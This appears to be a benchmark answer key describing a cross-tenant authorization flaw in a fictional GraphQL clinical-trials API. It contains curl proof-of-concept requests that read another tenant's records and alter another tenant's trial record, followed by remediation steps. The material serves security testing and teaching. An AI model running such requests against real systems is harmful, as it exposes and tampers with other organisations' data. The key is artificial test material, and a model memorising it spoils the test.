# Expected Response

## System
- Domain: Pharmaceutical / Clinical Trials
- System: TrialVault ClinicalOps API
- Example ID: GQL-0071

## Priority Findings

### Finding 1: Cross-Tenant Clinical Trial Write Operations Without Ownership Check (Pattern 1.6)
**Severity:** Critical
**Category:** BOLA / Write Operations

**Summary:**
Per §5.0 (Pattern 1.6 — write operations without ownership check): The `listResources(tenantId:)` resolver trusts the client-supplied `tenantId` parameter. An attacker from `tenant-8864` passed `tenantId: "tenant-1bb6"` to enumerate clinical trial resource records belonging to another pharmaceutical company. In a clinical trials platform, this exposes trial data, investigational drug records, and patient-linked study data protected under GCP/FDA/EMA regulations.

**Evidence from HAR:**
- Request: `POST https://api.trialvault-clinicalo.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-8864`
- Query: `listResources(tenantId: "tenant-1bb6") { resourceId ownerId data { sensitiveField } }`
- Response `200 OK`; `tenantId: "tenant-1bb6"`, `ownerId: "other-user-88641bb6"`, `sensitiveField: "CONFIDENTIAL-88641bb6"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-88641bb6`

**Root Cause (§4.0 RISK-GQL-071):** Write operations (mutations) also lack tenantId enforcement; `listResources` trusts client-supplied `tenantId`.

## Steps to Reproduce

### Step 1 — Cross-tenant list via client-supplied tenantId (HAR)
```bash
curl -s -X POST https://api.trialvault-clinicalo.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-8864" \
  -d '{"query": "query VulnerableOp { listResources(tenantId: \"tenant-1bb6\") { resourceId ownerId data { sensitiveField } } }"}'
```
**Vulnerable:** Returns `CONFIDENTIAL-88641bb6` from `tenant-1bb6`. **Secure:** FORBIDDEN.

### Step 2 — Write operation without ownership check (Pattern 1.6)
```bash
curl -s -X POST https://api.trialvault-clinicalo.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-8864" \
  -d '{"query": "mutation { updateResource(id: \"R-2071\", input: {status: \"completed\"}) { resourceId status } }"}'
```
**Vulnerable:** Modifies victim clinical trial record — data integrity compromised.

## Remediation
1. `listResources` must always use JWT `tenantId` — ignore client-supplied argument.
2. Resolver tenant guard on all mutations: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
3. Audit log all write operations with JWT subject and tenantId.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
